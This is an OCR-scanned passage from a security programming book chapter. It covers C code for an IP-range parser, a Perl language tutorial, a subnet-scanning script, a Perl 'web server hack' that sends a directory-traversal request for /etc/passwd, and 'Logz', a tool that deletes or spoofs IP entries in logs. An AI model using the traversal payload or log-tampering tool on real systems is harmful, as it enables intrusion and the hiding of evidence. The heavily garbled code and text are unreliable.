>m_index[3]j 
1 = 0 ) 
( 
•addr = 
U c t x -
>m_index[0] 
« 
0) s 
OxOOOOOOFF) * 
( ( c t x -
>m_index[l] 
« 
8) s, 
OxOOOOFFOO) " 
( ( c t x -
>itl_index[2] 
« 
16) U 
OxOOFFOOOO) * 
{ ( c t x -
>m_index[3] 
« 
24) & 
OxFFOOOOOO) ; 

38 
Chapter 1 • Security Coding 
261 
262 
263 
264 
265 
266 
267 
268 
269 
270 
271 
272 
273 
274 
275 
276 
277 
J 
r e t u r n ( • 
} 
-II; 
} 
ctx-
I 
->m_index [ 1 ] 
) 
} 
ctx->m_index[2] 
= 0; 
1 
} 
c t x - >m_index L 3 ] 
= 0; 
++cfcx-
>JI^_ index [ 3 ] 
r e t u r n ( 0 ) ; 
= 0; 
278 ) 
The ipv4_payse.c file is the logical heart of the program. It contains several functions 
that combine to provide the low-level parsing that is called by the maiii.c driver file. The 
ipi>4_parse_iv function parses individual number values (sv - single value). First, the 
function checks to see if a single value is a wild card or has an incorrect length. Next, a 
For loop is used to iterate through and place the resulting values in the m_state array. The 
ipi'4_parsc_r function determines the range oflPs by identifying the high and low values. 
The ipi>4_parsi'_tok function determines if there is a dash (-) character in the examined 
number value. This is necessary to determine if the value represents a range of addresses 
or a listing of one or more individual addresses. The ipv4_parsc_octct function parses 
numbers separated by commas, which indicates that the IP address includes a listing of 
numbers rather than a range. IP addresses are usually represented in dotted decimal nota-
tion, containing four 1-byte numbers separated by periods. The ipv4_ctx_itiit function 
creates four arrays in which to place the parsed IP data.The ipv4_parsc_next function 
aids the parsing process by moving to the next number in the dotted decimal, while the 
ipt>4_ncxt_addr function iterates through previously parsed data. 
»YM|«e; 
1 
g 2 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
IS 
16 
17 
18 
19 
/* 
* main.c 
* 
^ i n c l u d e 
<;stdio.h> 
ttinclude 
•ipv4_parse-h M 
i n t 
m a i n ( i n t argcj 
c h a r 
*argv[]) 
{ 
i p v 4 _ p a r s e „ c t x 
c t x ; 
unsigned i n t 
addr = 0; 
i n t 
i f ( a r g c 
!= 2) 
( 
p r i n t f ( " u s a g e : %s 
r e t u r n ( 1 ) ; 
r e t 
- 0; 
i p _ r a n g e \ r \ n " , 
/ / 
cont 
argv[01) 
/j context to hold state of ip range 

Security Coding • Chapter 1 
20 
) 
21 
22 
l! per-fprm i n i t i a l p a r s i n g of 
ip range 
23 
ret 
= ipv4_parse_ctx_init (ictx, argv[l]); 
24 
if(ret <: 0) 
25 
{ 
2 6 
p r i n t f ( " * * * 
i p v 4 _ p a r s e _ c t x _ i n i t ( ) 
f a i l e d . \ r \ n " } ; 
2 7 
r e t u r n ( l ) j 
28 
} 
29 
3 0 
/ / p r i n t out each i p i n range 
31 
w h i l e U ) 
32 
{ 
33 
// g e t next 
ip in range 
r e t 
- 
ipv4_parse_next 
(&ctxH fcaddr); 
35 
if t r e t < 0) 
3 6 
< 
37 
printf{"*** end of range,\r\n"); 
38 
break? 
39 
) 
40 
4 1 
/ / 
p r i n t i t 
out 
42 
printfi"ADDR: 
%d.%d.%d.%d\r\n*. 
43 
(addr >i 
0) & OxFF, 
44 
(addr >> 
8) £ OxFF, 
45 
(addr >=• IS) fc OxFF, 
46 
[addr » 
24) k OxFF); 
47 
} 
48 
4 9 
r e t u r n ( O ) ; 
5 0 
} 
main.c can be considered a driver file for the parsing engine, main.c receives the IF 
ranges to parse from standard in, on line 288. Lines 294 to 298 detail how the file is to 
be used, with the output sent to standard out. Lines 308 through 324 may be considered 
die high-level heart of the program. Using a While loop construct, the code calls on the 
ipi'4_panc_nexi function for the inputted IP address ranges, and prints out the results. 
1 r* 
2 
* i p v 4 _ p a r s e . h 
3 
* 
4 
v 
5 
6 
#ifndef 
IPV4_FAF.SE_H 
7 
Idefine 
IPV4_PAKSE_H 
8 
9 #ifdef 
cplusplus 
10 
e x t e r n "C" ( 
11 
ttendif 
12 
13 
typedef 
s t r u c t 
ipv4_parse__ctx 
14 
i 
1 5 
unsigned char 
m_state(43[256] ; 
16 
unsigned s h o r t m_index(4j; 
17 
18 
} i p v 4 _ p a r s e _ c t x ; 
19 
20 /* 

40 
Chapter 1 • Security Coding 
21 
* ipv4_parse_ctx_init() 
22 
* 
23 
-
24 
•/ 
25 
int ipv4_parse_ctx_init 
(ipv4_parse_ctx 
*ctx 
, 
26 
char 
*range 
) ; 
27 
28 
/* 
29 
* ipv4_parse_next_addr() 
30 
* 
31 
32 
v 
33 
int ipv4_parse_next 
(ipv4_parse_ctx 
*ctx 
34 
unsigned int 
*addr 
) ; 
35 
36 
#ifdef 
cplusplus 
37 
} 
38 
#endif 
39 
40 
ttendif /* 
IPV4_PARSE_H_ V 
41 
ipv4_parsc.h is a C/C++ header file. This file defines prototypes for the functions in 
the ipv4_})arse.c file. Defining these prototypes will get rid of warnings generated by a C 
compiler. Function prototypes must be declared for use by C++ compilers because of 
typing requirements. The extern "C" command is necessary to prevent name mangling 
by a C++ compiler, 
Perl 
Perl, created and posted to numerous Use nets by Larry Wall in 1987, was originally 
designed to be a scripting language that combined the multiple features and functionalities 
from the popular UNIX-based scripting engines into one core language. Features such as 
sh, sed, and atwfe, in combination with regular expressions, instantly made Perl a hit, and 
with the brushfire spread of Internet computing followed by the birth of the World Wide 
Web (WWW), Perl quickly became a household name in the world of scripting. 
Perl increased in popularity throughout the expansion of the WWW because it was 
quickly deemed one of the easiest methods for creating common gateway interface 
(CGI) applications. Such applications are used to provide dynamic data to Web users, 
enable access to databases, and provide common data formats and mechanisms for com-
municating with other applications. Perl is best known for the flexibility and implemen-
tation of regular expressions (rcgex) and is often cited as having the most powerful regex 
engine. Perl's regex engine allows you to create pattern matching and string substitution 
algorithms in one line of Perl code that potentially could have taken hundreds of lines of 
C code. For example, the following expression will search a supplied string and replace 
all occurrences of the string "cat" with the string "dog": 
Expression: 
Smystring •- 3/cat/dog/; 
In C, an algorithm within a loop structure to read in all data, process characters, and 
then replace strings of characters would have been a much more difficult and drawn-out 
programming process. Information security programmers, system administrators, students, 

Security Coding • Chapter 1 
41 
and hackers use Perl for a wide variety of reasons—conmiercial Web-based applications, 
task management tool kits, complex objects and classes for biological engineering, simple 
CGI Web page counters, and security tools. Popular security tools that use the Perl engine 
include Whisker, Narrow Security Scanner, and Wellenreiter, in addition to the plethora of 
available exploits created in Perl that leverage remote and local vulnerabilities. 
Perl is the scripting language for most of the security community' owing to its plat-
form-neutral implementation, easy socket structure, ability to utilize binary code, and 
overall acceptance. Between GNU's Perl and ActiveState's Win32 Perl distributions, inter-
preter versions are freely available for Microsoft 95/9S/ME/NT72(H)n/XP/.NET, Solaris, 
NetBSD/OpenBSD/FreeBSD, Irix, HPUX, Red Hat, and various other Linux platforms. 
Data Types 
In general, variable declaration within Perl is quite simple and dominated by three dif-
ferent data types: scalars, arrays, and hashes. Unlike most structured languages, Perl handles 
characters, strings, and numbers in the same fashion using automatic value determina-
tion. All scalars are prefaced with a S character. For example, to set the value 5 to the 
variable Gabe you would code $Gabe=5;, It is important to note, that unlike most other 
structured languages, variable initialization is not required; you can define a variable's 
value without any preceding requirements. Arrays, also known as list arrays, whether 
dynamic or static, begin with the @ character and can reference lists of characters, num-
bers, and strings. Plus, Perl has the functionality to utilize arrays of arrays. Example 1.25 
statically creates a multidimensional array with eight data fields. 
Example 1.25 Using Perl to Create a Multidimensional Array with Eight Data 
Fields 
^ArrayOEArray = ( 
[ "foster", Hlprice" ] , 
E "anthony", "marshal 1", "chad" 3, 
I "torn", "eric", "gabe" ], 
); 
print $ArrayOfArray[2][2] ; 
Output 
gabe 
A 
NOTE 
The output for the previous code would print out "gabe," not "marshall," 
because the array reference starts out at [0] [0] and not [1] [1]. 
Hashes, or associate arrays, permit users to access entries stored in an array via a cor-
responding string instead of the static array list. Array lists with the corresponding entry, 
such as those shown in Example 1.26, allow you to store strings and numerical data in 
the same array without having to reference each element in hierarchical order. 

42 
Chapter 1 • Security Coding 
Example 1.26 Array Lists 
%jobs = ("Coder", 21, 
"Programmer", 24, 
"Developer", 
21); 
The next corresponding array entry can be found with the following expressions 
using string references instead of static integers. These hash tables enable users to manage 
and retrieve data from much larger array lists than if they were merely using singular 
arrays or non-hashed-based arrays. In Example 1.27, data is retrieved from the associative 
array by specifying a string.The first line returns the value of 27, while the second line 
returns 24, and the third returns a value of 21. 
Example 1,27 Specifying a String to Retrieve Data from an Associative Array 
Sjobs{"Developer"}; 
$jObs{"Programmer"}; 
$jobs{"Coder"}; 
Perl includes the functionality to convert list arrays to hash tables and hash tables to 
list arrays. This functionality is especially useful when retrieving entire sets of informa-
tion or systematically evaluating each item in an array. For the following lines of code, 
line 1 converts the original hash table to a list array while line 3 executes the opposite of 
converting the list array to a hash table. Line two references the third element in the 
array and would return the value of 24, as defined by the previous example. 
1 @staticjobs • %jobs; 
2 $Etaticjobs[3] ; 
3 %jobscopy - istaticjobs; 
Notice how the %, @, and S are all used in the preceding example, each for a dif-
ferent data type. Referencing each type with the correct corresponding prefix is critical. 
Operators 
Perl has five different categories of operators: arithmetic, assignment, logical, relational, and 
string.The operator categories are used to initialize, define, relate, compute, or modify 
expression or variable data as needed. The data in Table 1.1 defines the arithmetic opera-
tors used in the Perl core. 
Table 1.1 Perl Arithmetic Operators 
Operator 
+ 
ence 
-
* 
/ 
% 
-A- A-
Synopsis 
Returns the sum of two variables 
Returns the difference of two variables 
Returns the product of two variables 
Returns the quotient of two variables 
Returns the modulus or remainder of 
two variables 
Returns the power of two variables 
Example 
Seducation + Sexperi-
$education - $experience 
$num1 * $num2 
$num1/$num2 
$num1 % $num2 
$num1 ** $num2 

Security Coding • Chapter 1 
43 
Assignment operators are used to define and manipulate scalar variables and not 
arrays. Minimally different from the arithmetic operators, assignment operators reassign 
new values to the same scalar within a single expression. For example, the $iin»iber=+2; 
expression where number scalar equals 5 would reassign the variable from 5 to 7 post 
execution.Table 1.2 summarizes all the assignment operators. 
Table 1.2 Perl Assignment Operators 
Operator 
Synopsis 
Example 
+ + 
+ = 
/= 
%= 
X = 
Assigns a value to a variable 
Increments the value of a variable by 1 
Decrements the value of a variable by 1 
Increases the value of a variable by a 
defined amount and reassigns the new 
value back to the original variable 
Decreases the value of the variable by a 
defined amount and reassigns the new 
value back to the original variable 
Multiples a variable by a defined value 
and reassigns the new value back to the 
original variable 
Divides a variable by a defined value and 
reassigns the new value back to the 
original variable 
Raises a defined variable by another 
defined variable or value and 
reassigns the new value back to the 
original variable 
Divides a variable by a defined value 
then assigns the remainder back to the 
original variable 
Repeats a string a defined number of 
times and reassigns the new value back 
to the original variable 
Concatenates, or appends, the contents 
of one string to the end of another 
$num1 = 10 
$gabe = red 
$num1 + + 
+ + $num1 
$num1 — 
—$num1 
$num1 += 10 
$num1 -= 10 
$num1 *= 10 
$num1 /= 10 
$num1 * * = 3 
$num2 = (3 * * = $num1) 
$num1 %= 3 
$jim x= 10 
$jim .= "my" 
$jim .= Jfoster 
Most logical expressions, or expressions implementing logical operators, are utilized 
at the onset of flow control structures to determine which execution path should be 
carried out.These operators compare expressions or variables and return true or false 
values. Table 1.3 summarizes the three logical operators, 

44 
Chapter 1 • Security Coding 
Table 1.3 Perl Logical Operators 
Operator 
Synopsis 
Example 
&& 
Returns true if two expressions are true 
(x= =1) && (y= =1) 
|| 
Returns true if one of two expressions 
(x= =1) || (y= =1) 
are true 
! 
Returns true if the expression is not true 
!(cat- -dog) 
Multiple expression algorithms rely on relational operators to test and quantify the 
differences between one or more expressions. It is important to note that all relational 
operators used in conjunction with their expressions return Boolean values: true and 
false. Table 1.4 shows the numeric and string-equivalent relational operators. 
Table 1.4 Perl Relational Operators 
Numeric 
String 
Synopsis 
Example 
- - 
eq 
Returns true if two values are equal $num1 - -
$num2 
$foo eq "bar" 
!- 
ne 
Returns true if two values are 
$num1 !- $num2 
not equal 
$foo ne "bar" 
> 
gt 
Returns true if the preceding value 
$num1 > $num2 
is greater than the second value 
$foo gt "bar" 
< 
It 
Returns true if the later value is 
$num1 < $num2 
less than the second value 
$foo It "bar" 
>= 
ge 
Returns true if the preceding 
$num1 >= $num2 
value is greater or equal to 
$foo ge "bar" 
the second value 
<- 
le 
Returns true if the preceding 
$num1 <- $num2 
value is less than or equal to 
the second value 
$foo le "bar" 
String operators assist in the control, modification, and searching of string data types. 
In addition to the operators, multiple string-specific regular expressions can be used to 
assist in searching, pattern matching, and string replacement. Table 1.5 is a synopsis of the 
string operators implemented into the Perl language. 
Table 1.5 Perl String Operators 
Operator 
Synopsis 
Returns the concatenated, or appended, 
string the later string to the first 
Example 
$foo.$bar 
Continued 

Security Coding • Chapter 1 
Table 1.5 Perl String Operators 
Operator 
Synopsis 
Example 
x 
Returns the value of a string that has 
been strung together a defined number 
of times 
index() 
Returns the offset of a string that is 
identified in another string 
substrO 
Returns the substring of another string 
given an index 
$foo x $bar 
$in - index 
($foo, $bar); 
substr($foo, Sin, $len) 
A Sample Perl Script 
Example 1.28 contains 35 lines of code that can be used to generate the IP address list 
when parsing a subnet range for testing. Since Perl scripts are almost never executed 
within GUIs or have their own interfaces, command line parsing of variables becomes 
extremely important. One of the hardest types of data to parse is ranges, since they usu-
ally contain multiple tokens or signify multiple variables. Extracting these variables can 
be tedious and cumbersome and even inaccurate if the proper techniques are not used. 
Example 1.28 Subnet IP Address Parsing from the Command Line 
1 i* l /usr/bin/perl 
2 
i£(@ARGV<2){print "Usage: $0 <network> cport>\nExample: $0 10.*.*.* 80 or 10.4.*.* 80 
or 10.4.3.* 80\n";exit; } 
3 else( 
4 
use 
IO::SOCket; 
$SIP=-@ARGV[Q]•; 
Sport="@flRGV[l]"j 
( $ i p l , S i p 2 , $ i p 3 , $ i p 4 ) = s p l i t l A . / . $ s I P ) ; 
i£{$ip2 == •*•) 
(Sip2=l; $ip3=l; $ip4=l; $x='a'; print "Scanning a Class A\n";) 
elsiE($ip3 == '*•) 
($ip3=l; $ip4=l; $x='b'; print "Scanning a Class B\n";) 
elsif(Sip4 == '*•) 
($ip4=l; $x="cH; print "Scanning a Class C\n";) 
s 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
$x 
while($ip2<255 && $x -- 
a') 
£ 
while[$ip3<:255 St. ($x == 'a 
t 
while($ip4<255) 
{ 
$ipaddr="Sipl.$ip2.$ip3.$ip4" 
print "Sipaddr\n"; 
#IP_connect($ipaddr); 
Sip4++; 
} 
$ip4=l; 
$ip3-t-+; 
iflSx eq 'CI {Sip3=255; Sip2=255; ) 
} 
'b'l) 

46 
Chapter 1 • Security Coding 
30 
$ip4=l; 
31 
$ip3=l; 
32 
$ip2++; 
33 
if($x eq •c 
|| $x eq -b') {$ip3=255; $ip2=255;} 
34 
} 
35 
} 
Analysis 
Line 1 is commonly used in U N I X and Linux Perl configurations as the location for the 
main Perl binaries. This is not necessary in nearly all Win32 installations and configura-
tions. Line 2 checks in an unintelligent fashion, that two parameters were passed to the 
script via the command line and if for some reason there were less than two then a 
Usage statement is printed to STDOUT. 
Lines 5 and 6 set the variables to that of the parameters passed to the command line. 
Notice that there is no error checking on these variables before parsing the values. This 
is deliberate, because the main goal for this exercise is to learn how to increase IP 
addresses. 
Line 6 uses the Perl "split" function to fragment the passed-in IP address into four 
distinct integers that can be individually increased. 
Lines 8 through 13 are included for aesthetic purposes and print out what size of 
network is passed into the script by looking for how many asterisks are passed. 
The remainder of the program is embedded with loops that effectively increment 
the IP address until the desired target range is complete,The Sip4 variable holds the last 
of the four octets in the IP address whereas 123 is the last octet: 10.9.5.123. Since Sip4 
is the deepest loop, it is increased until it reaches 255 as seen on line 19, then passed 
back to the container loop on line 17.This container loop executes and increments the 
Sip3 octet if the desired network was a class A or class 13, also seen on line 17. 
Line 23 calls a fictional function while passing it the current IP address.This is to 
demonstrate the simplicity of using the IP address post generation. The outmost loop 
only gets executed if the network is a class A address. Note that even the outmost loop 
only increments the second octet, not the first. 
Special Variables 
Beyond the previously covered data types and variable declaration syntax, Perl has incor-
porated a set of "special variables" into the core functionality of the language. These 
variables usually store dynamic information that pertains to single instances of scripts or 
script execution and functionality.The following variables are considered special vari-
ables. 
• 
SO This variable stores the name of the script that is currently being executed, 
which is useful for referencing the script name for the reporting and forking. 
• 
$_ This variable is commonly used to search and match strings in the default 
input stream. 

Security Coding • Chapter 1 
47 
• 
$/ This variable is defined as the input record separator to segment the input 
stream into multiple components.The default value for separation is the new-
line character, Vi. 
• 
@ARGV The ARG V list array contains the command line arguments pro-
cessed during script execution. List arrays are processed via direct associations; 
for example, $ARCV[0] is the first argument passed to the Perl script. 
• 
@INC Different from the next %INC associative array, this list array contains 
a list of locations to look for script dependencies to include do and require 
files. 
• 
%INC The %INC array contains a list of strings for all of the included and 
required files that the current script is dependent on for complete and correct 
parsing and execution. 
• 
%ENV Similar to most other programming languages, the %ENV array con-
tains all of the system's environment variables. 
• 
STDIN Utilized to declare or reference the default input stream for the Perl 
script. STDIN usually refers to human-driven input ended by a CON-
TROL_RUTURN or predefined escape sequence. 
• 
STDOUT Utilized to declare or reference the default output stream for the 
Perl script. In just about all cases, this prints to the command prompt on 
Win32 systems and the local shell for UNIX-based platforms. 
• 
STDERR Utilized to declare or reference the default error stream for the 
Perl script. This is often used in capturing and debugging unexpected errors. 
The preceding STD variables are excellent media for capturing platform-indepen-
dent variables that can be displayed in the platforms' defined methods. For example, in 
most UNIX and Linux environments, STDOUT would display messages and data to 
shells, yet in Microsoft's Win32 environments, these would be displayed in the command 
prompt windows. 
Pattern Matching and Substitution 
The enormously hyped and undoubtedly worthy regular expression engine in Perl sur-
passes all other languages when it comes to pattern searching and matching.Two func-
tions automatically included within Perl are niatcii and snbst. Both are extremely easy to 
use and implement. Match takes two arguments: the first is the string you want to search 
within, and the second is the pattern you are looking for.The substitution function 
(subst) takes the same two initial parameters, but replaces the pattern with the supplied 
substitution string; 
• 
match($str, (pattern) 
• 
subst(Ssti; Spattern, Substitution) 

Chapter 1 • Security Coding 
In addition to the two previously defined functions, there are also three shortcuts 
that can be used inline for matching or replacing. In the following examples, the first 
line assigns $codc to equal the matched pattern "hacker," while the second is searching 
for anything that does not match hacker.The third line uses an inline substitution 
expression that substitutes the word hacker with "cracker." 
Scode =~ m/hacker/; 
Scode =! Whacker/; 
$code =- s/hacker/cracker/; 
The following is an expression to identify all characters, upper or lower case: 
/ [ A - Z a - z ] / 
This identifies lowercase characters and all digits: 
/[0-9a-z]/ 
Regular Expression Modifiers 
The following list summarizes Perl's regular expression modifiers: 
• 
/e The e modifier is utilized to help evaluate code; for example, it evaluates 
the right side of a s/// expression. 
• 
/ee Similar to the previous modifier with the only difference being that the 
string residing to the right of the s/// should be interpreted first, then exe-
cuted as code. 
• 
/g Utilized to specify whether a pattern should be searched globally. 
• 
/gc If a pattern fails in the boolean sense, this modifier will ensure that the 
search position is not reset. 
• 
/i Utilized to create case insensitivity or ignore case for the supplied pattern. 
• 
/m Helpful in identifying strings with embedded \H characters by setting the 
A character to match a pattern before a newline and the $ to match a pattern 
after the newline. 
• 
/o Utilized to inform the engine that the regular expression should only be 
interpreted once. 
• 
A Similar to fm, this modifier also helps match patterns with embedded new-
line characters.The following sets the"." to match every newline and also 
ignores depreciated $*. 
• 
/x This modifier is most commonly utilized to help elevate interpreted white 
space and comments in an expression.This is infrequently used, but is 
extremely valuable in creating well-documented and well-understood Perl 
code. 

Security Coding • Chapter 1 
49 
Canonical Perl Tools 
This section looks at example scriprs that demonstrate some of the more important fea-
tures and widely used technologies built into the Perl language. Information security pro-
fessionals commonly use Perl as a quick means for recreating security issue 
proof-of-concepts, writing exploits, testing products and applications, identifying new 
Web-based vulnerabilities, and creating complex regular-expression engines. As with most 
other languages, Perl scripts cannot be compiled in the sense that they are modified to 
byte code after compilation. Structured languages that can be compiled offer an additional 
layer of security because the source code cannot be easily ascertained when executing the 
application. 
However, there are a few programs that exist to "compile" Perl scripts, or more 
accurately, build Perl scripts into executable applications. Most of these programs use a 
bundling technique that bundles or wraps Perl's core language libraries and dynamic link 
libraries (DLLs) with the script or scripts appended to the end of the package. This tech-
nique temporarily stores the language in memory when executing the script, then 
simply reallocates that memory space at script completion. The major downside of using 
these Perl compilers is the size of the executable; it is significantly increased by the files 
that must be included within the bundled .cxc file, which increases the overall size. 
Perl compilers include: 
• 
ActiveState's Perl Development Kit (www.activestate.com) 
• 
PerlCC (http;//www.perl.com/doc/mantial/html/utils/perlcc.html) 
I Am a Perl Coder! 
Example 1.29 is nothing more than a modified "hello, world" script, but it should give 
you an example of the easy-to-use syntax of the language. The middle line is merely a 
comment; 
#1 /usr/local/bin/perl 
#My first script 
print ("I am a Perl CorJerl*); 
The Canonical Web Server Hack 
Web server hacks written in Perl (also commonly referred to as CGI hacks), are 
among the easiest types of exploits to write. Any type of vulnerability that can be 
exploited via the Uniform Resource Identifier (URI) field in a Web browser or via a 
direct Web server command is simple to reproduce in Perl. 
v4>i» Example 1.29 The Canonical Web Server Hack 
#[ /usr/local/bin/perl 
2 tfThe Canonical Web Server Hack 
3 use 10::Socket ; 
4 use strict; 
5 print M \nHere is your Introduction Sentence\n\n."; 

50 
Chapter 1 • Security Coding 
6 print "Generic Usage Statement: canonical.pl 
target^ipsddress \n* ; 
7 my Shost - $ARGV[0J; 
8 my Sport = 60; 
9 my $attack_string = • GET /cgi-bin/bad.cgi?q-.-/./,/,/./•/./•/./,/etc/passtod%00\n\n'; 
10 my Sreceivedline; 
11 my @thedata; 
12 my Stcpval - getprotobyname('tcp") ; 
13 my SserverIP - inet_aton($host) ; 
14 my SserverAddr - sockaddr_in(80, $&erver!P) ; 
15 my £protocol_na4ne = "tcp" ; 
16 my Siaddr = inet_aton($host) || die print("Error with Target: $host"J; 
17 my $paddr = sockaddr_in{$port, Siaddr) || die print("Error with Target Port or Address"}; 
18 my $proto = getprotobyriamet' tcp') || die printfError Retrieving Protocol Utilized for 
Socket Connection"); 
19 £ocket(S0C, FF_INETH SQCK_STREAM, Sproto) || die print("Error Creating Socket!")? 
20 connect{SOC. $paddr) 
| die print("Error with Socket Connection!-); 
21 send{SOC,Sattack„string,0); 
22 ethedata^SOC*j 
23 
close (SOC): 
24 
print "Here is the Received Data:\n"; 
25 
foreach $receivedline(@thedata] 
26 { 
27 
print *$receivedline*; 
28 ) 
Analysis 
• 
All of the variables required to execute the attack are defined on lines 7 
through 18. 
• 
On lines 19 and 20, the script creates and initializes a socket that will be used 
as the medium for delivering the payload to the target system.The payload 
variable S(tlltuk_strinf> is sent to the target system on line 21, while the retrieved 
data is stored into the @thcdata list array. 
• 
Lastly, as noticed on lines 24 through 28, after the payload has been sent and a 
response received, each line is printed out to STDOUT. 
A Log Modification Utility 
As stated previously, Perl is known for its ability to identify, utilize, and manipulate 
strings. It has an advanced ability to conduct string parsing and string searching and 
replacing, using only regular expressions wrapped in /.The tool in Example 1.30 
demonstrates some of the string matching and replacing capabilities; it also delves into 
random number creation and string creation. Get Opt, a library that is distributed with 
Perl, is used in this example. 
„4„ E i S Example 1.30 Logz 
#• /usrr/bin/perrl 
2 ttLogz version 1.0 
3 ttBy; James C. Foster 

Security Coding • Chapter 1 
51 
4 
^Released by James C. Foster & Mark Burnett at BlackHat Windows 2004 in Seattle 
5 ((January 2004 
6 
7 use Getopt::Std; 
S 
9 
getopts("d:t:rhs:1;• ] 
| usage() ; 
10 
11 
Slogfile = $cpt_l; 
12 
13 
########## 
14 
15 
if (Sopt_h == 1) 
16 { 
17 
usage(); 
18 } 
19 
######*### 
20 
21 
if (Sopt_t ne M" k& Sopt_s eq M " ) 
22 { 
23 
open (FILE, "Slognle"); 
24 
25 
while (<FILE>) 
26 
C 
27 
$ranip=randomip{); 
28 
s/$opt_t/$ranip/; 
29 
pushietemplog,$_) ; 
30 
next; 
31 
} 
32 
33 
close FILE; 
34 
open (FILE2, ">$logfile-| || dieCcouldnt open"),-
35 
print FILE2"@templog"; 
36 
close FILE2; 
37 } 
38 
#*#«*##*## 
39 
40 
if ($opt_s ne "") 
41 { 
42 
open (FILE, "Slogfile"); 
43 
44 
while 
(<:FILE>) 
45 
c 
46 
s/$opt_t/$opt_s/; 
47 
push(@templog,$_); 
48 
next; 
49 } 
50 
51 
Close FILE; 
52 
open (FILE2, ">$logfile") || dieCcouldnt open"); 
53 
print FILE2"@templog"; 
54 
close FILE2; 
55 
56 } 
57 
########## 
58 
59 
if (Sopt_r ne ••) 
60 { 

Chapter 1 • Security Coding 
61 
open (FILE, "Jlogfile"); 
62 
63 
while (<FILE>) 
64 
{ 
65 
$rcmip=t"andomip () ; 
66 
s / ( ( \ d + ) \ . ( \ d + ) \ . ( \ d + ) \ . ( \ d t ) ) / S r a n i p / ; 
67 
push{@temploa;, $_) ; 
68 
next; 
69 
} 
70 
71 
close FILE; 
72 
open [FILE2, ">$lognle") || die["couldnt open"); 
73 
print FILE2"Stemplog"; 
74 
close FILE2; 
75 } 
76 ########## 
77 
78 it [$opt_d ne "") 
79 { 
80 
open (FILE, -$logfile"}; 
81 
82 
while (<FILE>) 
83 
( 
84 
85 
if (/.*$opt_a.v> 
86 
{ 
87 
next; 
88 
> 
89 
90 
push(@templcg, $_) ; 
91 
next; 
92 
93 
} 
94 
95 
close FILE; 
96 
open (FILE2, ">$logfile") || die("couldnt open-); 
97 
print FILE2 •etemplog-; 
98 
close FILE2; 
99 } 
100 ######£#### 
101 
102 sub usage 
103 { 
104 
print "\nLogz vl.O - Microsoft Windows Multi-purpose Log Modification Utility\n"; 
105 
print 
1I Developed by: James C. Foster for BlackHat Windows 2004\n" ; 
106 
print "Idea Generated and Presented by: James C. Foster and Mark Burnett\n\n"; 
107 
print "Usage: $0 [-options *]\n\n"; 
108 
print " \ t - h \ t \ t : Help MenuVn"; 
109 
print 
1l\t-d ipAddress\t: Delete Log Entries with the Corresponding IP Address\n"; 
110 
print 
1 l \ t - r \ t \ t : Replace a l l IP Addresses with Random IP Addresses\n"; 
111 
print " \ t - t targetlPVt; Replace the Target Address (with Random IP Addresses if none 
is specified) \n" ; 
112 
print "\t-s spoofedIP\t: Use this IP Address to replace the Target Address (optional) \n"; 
113 
print 
1 l\t-l logfile\t: Logfile You Wish to Manipulate\n\n"; 
114 
print "\tExample: logz.pl -r -1 IIS rlog\n"; 
115 
print "\t 
logz.pl -t 10.1.1.1 -s 20.2.3.219 -1 myTestLog.txt\n"; 
116 
print "\t 
logz.pl -d 192.10.9.14 IIS.log\n"; 

Security Coding • Chapter 1 
53 
117 ) 
118 ^generate random IP address 
119 
120 sub randomip 
121 { 
122 
$a = num() ; 
123 
$b = num() ; 
124 
$c = nvunOf 
125 
$d = num(); 
126 
$dot = ' . • ; 
127 
S t o t a l = "Sa$dat$h$dat$c$dat$d"; 
128 
return $total; 
129 } 
130 
131 sub num. 
132 { 
133 
Srandom = inc( rand(230)) + 11; 
134 
return $ random; 
1 3 5 } 
Execution 
C:\logz.pl 
-h 
Logz vl.0 - Microsoft Windows Multi-purpose Log Modification Utility 
Developed by; James C. Foster for BlackHat Windows 2004 
idea Generated and Presented by: James C Foster and Mark Burnett 
Usage: logz.pl [-options *] 
J: 
-d 
-i 
-t 
s 
-1 
ipAddress 
targetlP 
spoofedIP 
logfile 
Example; logz. 
logz 
logz 
pl 
•p3 
. : • : ! 
Help Menu 
Delete Log Entries with the Corresponding IP Address 
Replace all IP Addresses with Random IP Addresses 
Replace the Target Address {with Random IP Addresses if none is 
specified) 
Use this IP Address to replace the Target Address (optional) 
Logfile You Wish to Manipulate 
r -1 IIS.log 
-t 10.1.1.1 -s 20.2.3.219 -1 myTestLog.txt 
-d 192.10.9.14 IIS.log 
Analysis 
The Gctopt function is declared at line 7.This function allows programmers to easily set 
parameter flags. Values following any flag are then defined in an opt_ variable with the 
corresponding value, (e.g., /dcvcl/jS command -r user, this command will define an opt_r 
variable and set its value equal to user. 
At line 9,gctopU is used to pull arguments from the command line. In this instance, 
values followed by a :pull arguments, and all others return a Boolean value. These values 
become more important later in the script. If no values are passed in as arguments, the 
script will print out the usage (Help menu). 
At line 11, the first usage of a flag is set. The -/ flag is used to declare the log file to 
be altered.The logfile variable is set to the opt_l variable created with the -/ flag. 

54 
Chapter 1 • Security Coding 
At lines 15 through 18, the script checks if the help flag has been set as an argu-
ment; if it has, the script will print the usage. 
At line 22, the arguments are checked to make sure that the -/ option is set and the 
-S option is not set. This means that the programmer does not wish to spoof the target 
IP, but would like to replace all IPs in the file with random IP addresses. 
At line 24, the logfik pass with -/ is opened in the variable FILF, 
At lines 26 through 32, the file loops to replace the target IP with a random IP It 
does this by taking in a line from the file at line 26, generating a rmidoinIP (ranip) using 
the mudosiiip function declared at the end of the script. 
At line 29, the script searches for the target defined with -t on the line, replacing it 
with ranip. Line 30 pushes the current edited line into a temporary log that will be 
written later.The replacement process is handled by the command 
s/<scarcti_stn)ig>/<replcice_stn)ig>/, which replaces instances of the search string with the 
replacement string on the current line of the file. 
The loop then moves onto the next line and continues until the file is fully edited, 
closing the FILE at line 34. 
At line 35, FILE2 is opened and directed to output to the logfile declared by -/. If 
the logfilc cannot be opened, the script exits with the signal "couldn't open." 
At line 36, if everything has occurred successfully, the temporary log is dumped into 
the log file. Once the file is written, it is closed and released for further usage. 
At line 42, if the -s flag was set, the spoofed IP address will be used to replace the 
target. The log file is then opened at line 44. 
The While loop at lines 46 through 51 is nearly identical to the While loop previ-
ously discussed in lines 26 through 32.This instance of the replacement While loop, 
however, does not generate a random number to replace IP addresses in the log file. 
Instead, this loop replaces all instances of the target IP addresses in the file with a 
spoofed IP address set by the -s argument. 
At lines 53 through 56, the script performs the same write functions. It closes the 
current file at line 53.Then the script opens the log file to be written to line 54.The 
